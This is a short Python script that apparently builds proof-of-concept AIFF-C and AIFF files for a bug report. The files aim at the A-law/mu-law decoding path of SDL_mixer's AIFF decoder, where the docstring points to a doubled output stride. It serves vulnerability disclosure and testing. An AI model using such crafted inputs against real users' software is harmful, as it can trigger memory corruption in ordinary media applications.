#!/usr/bin/env python3
"""Craft minimal AIFF-C (FORM/AIFC) files for the real SDL_mixer AIFF decoder.

Only chunks the pinned decoder reads: FVER, COMM, SSND. The A-law/mu-law
COMM selects FetchALaw/FetchULaw, which contains the doubled output stride.
"""
import hashlib
import struct
import sys
from pathlib import Path

OUT = Path(sys.argv[1]) if len(sys.argv) > 1 else Path(__file__).parent / "evidence"

# 80-bit IEEE extended for 8000 Hz: exponent 0x400C, mantissa 0x7D00000000000000.
SANE_8000 = bytes((0x40, 0x0C, 0x7D, 0x00, 0x00, 0x00, 0, 0, 0, 0))


def chunk(kind: bytes, data: bytes) -> bytes:
    assert len(kind) == 4
    pad = b"\0" if len(data) % 2 else b""
    return kind + struct.pack(">I", len(data)) + data + pad


def aifc(compression: bytes, data: bytes) -> bytes:
    assert len(compression) == 4
    fver = chunk(b"FVER", struct.pack(">I", 0xA2805140))
    comm = struct.pack(">H", 1) + struct.pack(">I", len(data)) + \
        struct.pack(">H", 8) + SANE_8000 + compression
    comm = chunk(b"COMM", comm)
    ssnd = chunk(b"SSND", struct.pack(">II", 0, 0) + data)
    body = b"AIFC" + fver + comm + ssnd
    return b"FORM" + struct.pack(">I", len(body)) + body


def aiff(data: bytes) -> bytes:
    comm = struct.pack(">H", 1) + struct.pack(">I", len(data)) + \
        struct.pack(">H", 8) + SANE_8000
    ssnd = chunk(b"SSND", struct.pack(">II", 0, 0) + data)
    body = b"AIFF" + chunk(b"COMM", comm) + ssnd
    return b"FORM" + struct.pack(">I", len(body)) + body


def main() -> None:
    OUT.mkdir(parents=True, exist_ok=True)
    payload = bytes((0x55 + (i & 0x3F)) & 0xFF for i in range(256))
    cases = {
        "alaw256.aifc": aifc(b"alaw", payload),
        "ulaw256.aifc": aifc(b"ulaw", payload),
        "alaw8.aifc": aifc(b"alaw", payload[:8]),
        "raw256.aifc": aifc(b"raw ", payload),
        "pcm8_256.aiff": aiff(payload),
    }
    for name, blob in cases.items():
        (OUT / name).write_bytes(blob)
        print(f"{name} size={len(blob)} sha256={hashlib.sha256(blob).hexdigest()}")


if __name__ == "__main__":
    main()
